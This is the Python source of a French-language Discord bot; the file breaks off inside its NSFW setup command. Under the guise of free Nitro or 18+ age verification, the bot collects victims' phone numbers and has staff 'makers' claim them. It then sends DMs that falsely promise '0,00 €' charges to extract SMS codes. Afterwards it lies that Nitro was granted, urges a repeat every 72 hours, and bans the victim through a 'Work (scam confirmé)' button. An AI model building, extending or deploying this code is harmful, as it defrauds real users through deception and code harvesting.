import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import os
import logging
from typing import Optional, Dict
from aiohttp import web
import config
from utils import validate_phone, mask_phone, validate_code, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist, remove_user_blacklist, load_setup_data, save_setup_data

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

cooldowns: Dict[int, float] = {}
pending_verifications: Dict[int, dict] = {}
staff_active_claims: Dict[int, dict] = {}
retry_cooldowns: Dict[int, float] = {}
blacklist = load_blacklist()

# Couleurs
SETUP_COLOR = 0x5865f2          # Bleu Discord (setup normal)
SETUP_NSFW_COLOR = 0xff6a00     # Orange vif (setup NSFW)
COLOR_SUCCESS = 0x57f287
COLOR_WARNING = 0xfee75c
COLOR_DANGER = 0xed4245

# ===== HEALTH SERVER =====

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

# ===== BAN / UNBAN =====

async def ban_user(user_id: int, reason: str = ""):
    guild = bot.get_guild(config.GUILD_ID)
    if not guild:
        return False
    try:
        member = guild.get_member(user_id)
        if member:
            await member.ban(reason=reason, delete_message_days=0)
            return True
        else:
            await guild.ban(discord.Object(id=user_id), reason=reason, delete_message_days=0)
            return True
    except:
        return False

# ===== STAFF CLAIM VIEW (copier numéro) =====

class StaffClaimView(discord.ui.View):
    """View attachée au message éphémère quand un staff claim un numéro."""
    def __init__(self, phone: str, user_id: int, parent_view: "StaffPanelView"):
        super().__init__(timeout=None)
        self.phone = phone
        self.user_id = user_id
        self.parent_view = parent_view

    @discord.ui.button(label="📋 Copier le numéro", style=discord.ButtonStyle.secondary, custom_id="copy_phone_btn")
    async def copy_phone(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Envoie le numéro en texte brut pour que l'utilisateur puisse le copier facilement
        await interaction.response.send_message(
            f"📱 **Numéro :** `{self.phone}`",
            ephemeral=True
        )

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="claim_close_btn")
    async def claim_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.parent_view.closed:
            embed = discord.Embed(title="Déjà fermé", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.parent_view.claimed_by and self.parent_view.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul le staff qui a pris en charge peut fermer.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await self.parent_view.close_ticket("Fermé - Banni", do_ban=True, reason="Banni via fermeture depuis le panneau staff")
        embed = discord.Embed(title="Vérification fermée", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== PROOF BAN MODAL =====

class ProofBanModal(discord.ui.Modal, title="Bannir un utilisateur"):
    user_id_input = discord.ui.TextInput(
        label="ID de l'utilisateur",
        placeholder="Entrez l'ID Discord",
        min_length=10,
        max_length=30,
        required=True,
    )
    phone_input = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            target_id = int(self.user_id_input.value.strip())
        except:
            embed = discord.Embed(title="ID invalide", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        phone = self.phone_input.value.strip().replace(" ", "").replace("-", "")
        banned = await ban_user(target_id, "Banni via preuves - scam")
        add_to_blacklist(target_id, phone, blacklist)
        embed = discord.Embed(
            title="Utilisateur banni",
            description=f"**ID :** `{target_id}`\n**Numéro :** `{mask_phone(phone)}`\n**Banni :** {'Oui' if banned else 'Déjà banni'}",
            color=COLOR_DANGER
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== PROOF VIEW =====

class ProofView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Oui c'est legit", style=discord.ButtonStyle.success, custom_id="proof_yes")
    async def yes_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="Vote enregistré", description="Merci pour votre vote.", color=COLOR_SUCCESS)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Non c'est du scam", style=discord.ButtonStyle.danger, custom_id="proof_no")
    async def no_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(ProofBanModal())

# ===== VALIDATION CHANNEL VIEW =====

class ValidationChannelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone

    @discord.ui.button(label="Valider", style=discord.ButtonStyle.success, custom_id="val_validate")
    async def val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_user_blacklisted(self.user_id, blacklist):
            embed = discord.Embed(title="Déjà blacklisté", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        add_to_blacklist(self.user_id, self.phone, blacklist)
        banned = await ban_user(self.user_id, "Scam confirmé via validation")
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True
        embed = discord.Embed(title="Scam validé", description=f"<@{self.user_id}> banni et blacklisté.", color=COLOR_DANGER)
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
        await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.danger, custom_id="val_close")
    async def close_val_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if is_user_blacklisted(self.user_id, blacklist):
            embed = discord.Embed(title="Déjà blacklisté", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        add_to_blacklist(self.user_id, self.phone, blacklist)
        banned = await ban_user(self.user_id, "Banni via fermeture validation")
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True
        embed = discord.Embed(title="Ticket fermé", description=f"<@{self.user_id}> banni et blacklisté.", color=COLOR_DANGER)
        await interaction.response.edit_message(embed=interaction.message.embeds[0], view=self)
        await interaction.followup.send(embed=embed, ephemeral=True)

# ===== PHONE MODAL =====

class PhoneModal(discord.ui.Modal, title="Vérification téléphone"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        now = datetime.datetime.now().timestamp()
        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(title="Cooldown actif", description=f"Veuillez attendre {int(remaining)} secondes avant de réessayer.", color=COLOR_WARNING)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return
        if interaction.user.id in pending_verifications:
            embed = discord.Embed(title="Déjà en cours", description="Vous avez déjà une vérification en attente.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if is_user_blacklisted(interaction.user.id, blacklist):
            embed = discord.Embed(title="Accès refusé", description="Vous êtes blacklisté.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
        if is_phone_blacklisted(phone_raw, blacklist):
            embed = discord.Embed(title="Numéro blacklisté", description="Ce numéro est blacklisté.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        valid, err_msg = validate_phone(phone_raw)
        if not valid:
            embed = discord.Embed(title="Numéro invalide", description=err_msg, color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        cooldowns[interaction.user.id] = now
        embed_wait = discord.Embed(
            title="Demande envoyée",
            description="Votre demande a été prise en compte.\n\nUn membre du staff va vous contacter.\n\nAucun débit - 0,00 €",
            color=COLOR_SUCCESS
        )
        embed_wait.set_footer(text="Vérification • 0,00 €")
        await interaction.response.send_message(embed=embed_wait, ephemeral=True)
        await send_staff_panel(interaction.user, phone_raw)

# ===== BUILD STAFF EMBED =====

def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_requested: bool = False, timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    if timestamp is None:
        timestamp = datetime.datetime.now()
    embed = discord.Embed(title="NOUVELLE DEMANDE DE VÉRIFICATION", color=0x5865f2, timestamp=timestamp)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
    embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="Statut", value=status, inline=True)
    embed.add_field(name="Code demandé", value="Oui" if code_requested else "Non", inline=True)
    embed.add_field(name="Pris par", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
    embed.set_footer(text=datetime.datetime.now().strftime("%d/%m/%Y %H:%M") + " • Vérification")
    return embed

# ===== STAFF PANEL VIEW =====

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.claimed_by: Optional[int] = None
        self.code_requested = False
        self.closed = False
        self.message: Optional[discord.Message] = None
        self.auto_close_task: Optional[asyncio.Task] = None
        self.claim_view: Optional[StaffClaimView] = None

    async def close_ticket(self, status_text: str = "Fermé", do_ban: bool = True, reason: str = "Vérification fermée"):
        pending_verifications.pop(self.user_id, None)
        cooldowns.pop(self.user_id, None)
        if self.claimed_by and self.claimed_by in staff_active_claims:
            staff_active_claims.pop(self.claimed_by, None)
        self.closed = True
        if do_ban and self.user_id:
            add_to_blacklist(self.user_id, self.phone, blacklist)
            await ban_user(self.user_id, reason)
        if self.auto_close_task:
            self.auto_close_task.cancel()
            self.auto_close_task = None
        # Désactiver les boutons du panneau principal
        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True
        try:
            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status=status_text, claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=self.message.created_at if self.message else None)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            new_embed.color = COLOR_DANGER
            await self.message.edit(embed=new_embed, view=self)
        except:
            pass

    async def start_auto_close(self):
        try:
            await asyncio.sleep(300)
            if not self.closed and not self.code_requested and self.claimed_by is not None:
                await self.close_ticket("Fermé automatiquement (5 min)", do_ban=False)
        except asyncio.CancelledError:
            pass

    @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None:
            embed = discord.Embed(title="Déjà pris", description=f"Un maker est déjà sur le coup (<@{self.claimed_by}>).", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Fermé", description="Cette vérification est déjà fermée.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        staff_id = interaction.user.id
        if staff_id in staff_active_claims:
            old_data = staff_active_claims[staff_id]
            try:
                old_view = old_data["view"]
                await old_view.close_ticket("Fermé (nouveau claim)", do_ban=False)
            except:
                pass
        staff_active_claims[staff_id] = {"view": self, "user_id": self.user_id}
        self.claimed_by = staff_id

        # Message éphémère avec le numéro + bouton copier
        embed_reveal = discord.Embed(
            title="🔓 Numéro débloqué",
            description=f"```\n{self.phone}\n```\n*Cliquez sur « 📋 Copier » pour copier facilement.*",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        embed_reveal.set_footer(text="Ne partagez pas ce numéro")
        self.claim_view = StaffClaimView(self.phone, self.user_id, self)
        await interaction.response.send_message(embed=embed_reveal, view=self.claim_view, ephemeral=True)

        # Mettre à jour le panneau staff principal
        user_fetch = await bot.fetch_user(self.user_id)
        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="En cours", claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=interaction.message.created_at)
        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
        await interaction.message.edit(embed=new_embed, view=self)
        self.auto_close_task = asyncio.create_task(self.start_auto_close())

    @discord.ui.button(label="Demander le code", style=discord.ButtonStyle.success, custom_id="request_code_btn")
    async def request_code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="Action impossible", description="Prenez d'abord la vérification en charge.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut demander le code.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.code_requested:
            embed = discord.Embed(title="Déjà demandé", description="Le code a déjà été demandé à cet utilisateur.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Fermé", description="Cette vérification est fermée.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.auto_close_task:
            self.auto_close_task.cancel()
            self.auto_close_task = None
        self.code_requested = True
        pending_verifications[self.user_id] = {
            "phone": self.phone,
            "claimed_by": interaction.user.id
        }
        embed_confirm = discord.Embed(
            title="Message envoyé",
            description="Un message a été envoyé à l'utilisateur pour demander le code.",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        await interaction.response.send_message(embed=embed_confirm, ephemeral=True)

        # Log dans le salon de logs
        log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
        if log_channel:
            embed_log = discord.Embed(
                title="CODE DEMANDÉ",
                description="Code demandé pour un utilisateur.",
                color=COLOR_WARNING,
                timestamp=datetime.datetime.now()
            )
            embed_log.add_field(name="Staff", value=f"<@{interaction.user.id}>", inline=True)
            embed_log.add_field(name="Utilisateur", value=f"<@{self.user_id}> (`{self.user_id}`)", inline=True)
            embed_log.add_field(name="Numéro", value=f"||{self.phone}||", inline=True)
            embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
            embed_log.set_footer(text="Logs de vérification")
            await log_channel.send(embed=embed_log)

        # Envoyer le DM à l'utilisateur
        try:
            user = await bot.fetch_user(self.user_id)
            embed_dm = discord.Embed(
                title="Code de vérification",
                description=(
                    "N'ayez pas peur, c'est une simple vérification pour prouver votre âge.\n\n"
                    "Comme quand on relie une carte bancaire à PayPal, un prélèvement de 0 € est effectué "
                    "pour vérifier que le compte est valide.\n\n"
                    "Aucun débit ne sera fait sur votre facture téléphone. Le SMS reçu est juste un code de confirmation.\n\n"
                    "Une fois le code reçu, répondez à ce message avec le code à 4 chiffres."
                ),
                color=0x5865f2
            )
            embed_dm.set_footer(text="Répondez avec le code • 0,00 €")
            await user.send(embed=embed_dm)
        except discord.Forbidden:
            embed_fail = discord.Embed(title="Erreur", description=f"<@{self.user_id}> a ses MP fermés. Contactez-le manuellement.", color=COLOR_DANGER)
            await interaction.followup.send(embed=embed_fail, ephemeral=True)
            pending_verifications.pop(self.user_id, None)
            self.code_requested = False
            return

        # Mettre à jour l'embed du panneau staff
        user_fetch = await bot.fetch_user(self.user_id)
        new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status="Code demandé - en attente", claimed_by=self.claimed_by, code_requested=True, timestamp=interaction.message.created_at)
        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
        await interaction.message.edit(embed=new_embed, view=self)

    @discord.ui.button(label="✅ Work (scam confirmé)", style=discord.ButtonStyle.danger, custom_id="work_btn")
    async def work_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="Action impossible", description="Prenez d'abord la vérification en charge.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut utiliser ce bouton.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Déjà fermé", description="Cette vérification est déjà fermée.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await self.close_ticket("Scam confirmé - Banni", do_ban=True, reason="Scam confirmé par le staff")
        embed = discord.Embed(title="Scam confirmé", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Fermer", style=discord.ButtonStyle.grey, custom_id="close_btn")
    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None and self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="Action impossible", description=f"Seul <@{self.claimed_by}> peut fermer cette vérification.", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        if self.closed:
            embed = discord.Embed(title="Déjà fermé", description="Cette vérification est déjà fermée.", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        await self.close_ticket("Fermé - Banni", do_ban=True, reason="Banni via fermeture de vérification")
        embed = discord.Embed(title="Vérification fermée", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ===== ENVOYER PANEL STAFF =====

async def send_staff_panel(user: discord.User, phone: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return
    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return
    view = StaffPanelView(user.id, phone)
    embed = build_staff_embed(user=user, phone=phone, status="En attente", claimed_by=None, code_requested=False)
    embed.set_thumbnail(url=user.display_avatar.url)
    msg = await channel.send(content="@everyone", embed=embed, view=view)
    view.message = msg

# ===== VALIDATION CHANNEL =====

async def send_validation_channel_message(user: discord.User, phone: str, code: str, claimed_by: int):
    validation_channel = bot.get_channel(config.VALIDATION_CHANNEL_ID)
    if not validation_channel:
        return
    embed_val = discord.Embed(
        title="CODE DE VÉRIFICATION VALIDE",
        description=f"```\n  {code}  \n```",
        color=COLOR_SUCCESS,
        timestamp=datetime.datetime.now()
    )
    embed_val.add_field(name="Numéro", value=f"`{phone[:2]}******{phone[-2:]}`", inline=True)
    embed_val.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed_val.add_field(name="Validé le", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=False)
    embed_val.set_footer(text="Vérification validée")
    view = ValidationChannelView(user.id, phone)
    await validation_channel.send(content=f"<@{claimed_by}>", embed=embed_val, view=view)

# ===== GESTION DM CODE =====

async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = pending_verifications.get(user_id)
    if pending is None:
        embed = discord.Embed(
            title="Vérification expirée",
            description="Cette vérification a expiré. Vous pouvez utiliser la commande `/retry` pour relancer une demande.\n\nSinon contactez le staff.",
            color=COLOR_DANGER
        )
        await message.channel.send(embed=embed)
        return
    content = message.content.strip()
    valid, err_msg = validate_code(content)
    if not valid:
        embed = discord.Embed(title="Code invalide", description=err_msg, color=COLOR_DANGER)
        await message.channel.send(embed=embed)
        return
    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    pending_verifications.pop(user_id, None)
    embed_success = discord.Embed(
        title="Félicitation !",
        description=(
            "Vous avez reçu entre **7 et 12 Nitro Boost** sur votre compte Discord !\n\n"
            "**Comment les récupérer ?**\n"
            "Allez dans **Paramètres** > **Inventaire des cadeaux** et vous verrez vos Nitros en stock.\n\n"
            "**ATTENTION :**\n"
            "Pour éviter que Discord ne supprime les Nitros de votre inventaire, "
            "vous devez refaire cette technique toutes les **72 heures**. "
            "C'est une mesure de protection pour éviter que votre compte ne reçoive "
            "un avertissement ou ne soit banni.\n\n"
            "**Vous n'avez pas reçu le code ou vous vous êtes trompé ?**\n"
            "Pas de panique, vous pouvez réessayer après **10 minutes**.\n"
            "Utilisez la commande `/retry` dans ce message privé pour relancer le processus.\n\n"
            "**100% sécurisé** - Personne ne sera facturé, aucun risque pour votre compte "
            "si vous suivez les instructions. N'hésitez pas à demander des preuves "
            "au staff si vous avez des doutes.\n\n"
            "**N'oubliez pas de laisser un avis et des suggestions pour nous aider à nous améliorer !**"
        ),
        color=COLOR_SUCCESS
    )
    embed_success.set_footer(text="Nitro gratuit • 0,00 €")
    await message.channel.send(embed=embed_success)
    await send_validation_channel_message(message.author, phone, content, claimed_by)

    # Log
    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(
            title="CODE VALIDÉ",
            description="Code validé par un utilisateur.",
            color=COLOR_SUCCESS,
            timestamp=datetime.datetime.now()
        )
        embed_log.add_field(name="Staff", value=f"<@{claimed_by}> (`{claimed_by}`)", inline=True)
        embed_log.add_field(name="Utilisateur", value=f"{message.author.mention} (`{user_id}`)", inline=True)
        embed_log.add_field(name="Numéro", value=f"||{phone}||", inline=True)
        embed_log.add_field(name="Code", value=f"`{content}`", inline=True)
        embed_log.add_field(name="Date", value=datetime.datetime.now().strftime("%d/%m/%Y %H:%M"), inline=True)
        embed_log.set_thumbnail(url=message.author.display_avatar.url)
        embed_log.set_footer(text="Logs de vérification")
        await log_channel.send(embed=embed_log)

    # Ajouter le rôle vérifié
    if config.VERIFIED_ROLE_ID and config.GUILD_ID:
        guild = bot.get_guild(config.GUILD_ID)
        if guild:
            role = guild.get_role(config.VERIFIED_ROLE_ID)
            if role:
                member = guild.get_member(user_id)
                if member:
                    try:
                        await member.add_roles(role, reason="Vérification téléphone réussie")
                    except discord.Forbidden:
                        log.warning(f"Permission manquante rôle {user_id}")

    # Mettre à jour le panneau staff (désactiver)
    user_fetch = await bot.fetch_user(user_id)
    staff_guild = bot.get_guild(config.STAFF_GUILD_ID)
    if staff_guild:
        staff_channel = staff_guild.get_channel(config.STAFF_CHANNEL_ID)
        if staff_channel:
            async for msg in staff_channel.history(limit=50):
                if msg.embeds:
                    for embed in msg.embeds:
                        for field in embed.fields:
                            if field.value and str(user_id) in field.value:
                                try:
                                    view = discord.ui.View.from_message(msg)
                                    if view:
                                        for child in view.children:
                                            if isinstance(child, discord.ui.Button):
                                                child.disabled = True
                                    new_embed = build_staff_embed(user=user_fetch, phone=phone, status="Vérifié", claimed_by=claimed_by, code_requested=True, timestamp=msg.created_at)
                                    new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
                                    new_embed.color = COLOR_SUCCESS
                                    await msg.edit(embed=new_embed, view=view)
                                except:
                                    pass
                                break

# ===== BOUTON VÉRIFIER (global, persistant) =====

class VerifyButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="🔞 Vérifier" if False else "✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(PhoneModal())

class VerifyButtonView(discord.ui.View):
    def __init__(self, is_nsfw: bool = False):
        super().__init__(timeout=None)
        self.is_nsfw = is_nsfw
        btn_label = "🔞 Vérifier" if is_nsfw else "✅ Vérifier"
        btn = discord.ui.Button(label=btn_label, style=discord.ButtonStyle.success, custom_id="global_verify_btn")
        btn.callback = self._button_callback
        self.add_item(btn)

    async def _button_callback(self, interaction: discord.Interaction):
        await interaction.response.send_modal(PhoneModal())

# ===== COMMANDES SLASH =====

@bot.tree.command(name="setup", description="Crée le panneau de vérification dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Obtenez Discord Nitro Gratuitement",
        description=(
            "Suivez ces étapes simples pour obtenir plusieurs Nitro sans dépenser un centime :\n\n"
            "**1 - Procédure de Vérification :**\n"
            "- Cliquez sur \"✅ Vérifier\" en bas de cette page.\n"
            "- Entrez votre numéro de téléphone.\n\n"
            "**2 - Recevez le Code par SMS :**\n"
            "- Vous recevrez un code par SMS sur votre téléphone.\n"
            "- Ce code est essentiel pour la prochaine étape.\n\n"
            "**3 - Validez avec le Code :**\n"
            "- Une fois que vous avez reçu le code, entrez-le lorsque notre bot vous le demandera.\n"
            "- Cela liera votre numéro de téléphone à notre système sécurisé. "
            "Aucune de vos informations ne sera enregistrée, donc sauvegardez-les.\n\n"
            "**4 - Réclamez Vos Nitro :**\n"
            "- Après avoir validé avec le code, notre bot vous guidera vers la page de réclamation.\n"
            "- Suivez les instructions à l'écran pour recevoir vos Nitro gratuits.\n\n"
            "**Pourquoi Faire Cela ?**\n"
            "En liant votre numéro de téléphone, vous devenez éligible pour notre technique exclusive "
            "qui permet de générer plusieurs Nitro. C'est une opportunité unique de profiter des "
            "avantages de Discord Nitro sans frais.\n\n"
            "**Attention :**\n"
            "- Assurez-vous d'entrer un numéro de téléphone valide.\n"
            "- Le code SMS est crucial, ne le partagez avec personne d'autre que notre bot.\n"
            "- Vous ne serez facturé de 0 centime pour cette technique."
        ),
        color=SETUP_COLOR
    )
    embed.set_footer(text="Nitro gratuit • 0,00 €")
    view = VerifyButtonView(is_nsfw=False)

    # Vérifier s'il y a déjà un setup dans ce salon → update
    setup_data = load_setup_data()
    existing = None
    for entry in setup_data:
        if entry["channel_id"] == interaction.channel_id:
            existing = entry
            break

    if existing and existing.get("message_id"):
        try:
            old_msg = await interaction.channel.fetch_message(existing["message_id"])
            await old_msg.edit(embed=embed, view=view)
            embed_success = discord.Embed(title="Panneau mis à jour", description="Le panneau de vérification a été mis à jour dans ce salon.", color=COLOR_SUCCESS)
            await interaction.response.send_message(embed=embed_success, ephemeral=True)
            return
        except (discord.NotFound, discord.HTTPException):
            pass  # Message supprimé, on en crée un nouveau

    await interaction.response.send_message(embed=embed, view=view)
    msg = await interaction.original_response()

    # Sauvegarder dans setup_data
    if existing:
        existing["message_id"] = msg.id
        existing["type"] = "normal"
    else:
        setup_data.append({
            "channel_id": interaction.channel_id,
            "message_id": msg.id,
            "type": "normal"
        })
    save_setup_data(setup_data)
    log.info(f"Setup fait dans #{interaction.channel.name} (msg: {msg.id})")


@bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification NSFW dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setupnsfw(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔞 VÉRIFICATION 18+ OBLIGATOIRE",
        description=(
            "**RÈGLEMENT OFFICIEL DU SERVEUR**\n"
            "**SERVEUR STRICTEMENT RÉSERVÉ AUX ADULTES (18+)**\n\n"
            "En restant sur ce serveur, vous confirmez être majeur et accepter l'intégralité du règlement ci-dessous.\n\n"
            "**ÂGE & VÉRIFICATION**\n"
            "**Vérification obligatoire**\n"
            "L'accès au serveur est strictement réservé aux personnes majeures.\n"
            "Tout membre mineur ou suspecté de l'être sera banni définitivement.\n"
            "Les salons NSFW nécessitent une validation préalable par la fourniture d'un numéro de téléphone "
            "pour recevoir un code de vérification à 4 chiffres. Ce processus est gratuit et rien ne sera facturé.\n\n"
            "**RESPECT & CONSENTEMENT**\n"
            "**Respect des membres**\n"
            "Les insultes, menaces, discriminations et harcèlement sont interdits.\n"
            "Le consentement doit être respecté à tout moment.\n"
            "Aucun contenu ou sollicitation non désiré ne sera toléré.\n"
            "**Messages privés & comportement**\n"
            "Le spam MP, forcing ou comportements déplacés sont interdits.\n"
            "Respect obligatoire envers les membres et le Staff.\n\n"
            "**CONTENUS INTERDITS**\n"
            "**Contenus prohibés**\n"
            "Tout contenu illégal entraîne un bannissement immédiat.\n"
            "Le partage de contenus privés, leaks ou doxxing est strictement interdit.\n"
            "Les liens malveillants, raids, nukes et phishing sont interdits.\n\n"
            "**UTILISATION DES SALONS**\n"
            "**Organisation des salons**\n"
            "Utilisez les salons adaptés au contenu partagé.\n"
            "Les contenus hors-sujet pourront être supprimés.\n"
            "**Liens externes**\n"
            "Les liens douteux ou frauduleux sont interdits.\n"
            "Toute publicité sans autorisation est interdite, y compris en MP.\n\n"
            "**SÉCURITÉ & MODÉRATION**\n"
            "**Sécurité du compte**\n"
            "L'authentification à deux facteurs (2FA) est recommandée.\n"
            "Ne partagez jamais vos informations personnelles.\n"
            "**Sanctions**\n"
            "Le Staff peut warn, mute ou bannir sans avertissement préalable.\n"
            "Les décisions du Staff sont définitives et non négociables.\n\n"
            "**VALIDATION**\n"
            "En restant sur ce serveur, vous confirmez avoir :\n"
            "✔ Lu le règlement\n"
            "✔ Compris les règles\n"
            "✔ Accepté les conditions du serveur\n\n"
            "**Ce serveur est NSFW et contient du contenu pour adultes.**\n\n"
            "---\n\n"
            "**Pour vérifier votre âge :**\n"
            "Cliquez sur \"🔞 Vérifier\" ci-dessous, entrez votre numéro de téléphone, "
            "et suivez les instructions pour recevoir votre code de vérification à 4 chiffres."
        ),
        color=SETUP_NSFW_COLOR
    )
    embed.set_footer(text="🔞 Vérification 18+ obligatoire • 0,00 €")

    view = VerifyButtonView(is_nsfw=True)

    # Vérifier s'il y a déjà un setup dans ce salon → update
    setup_data = load_setup_data()
    existing = None
    for entry in setup_data:
        if entry["channel_id"] == interaction.channel_id:
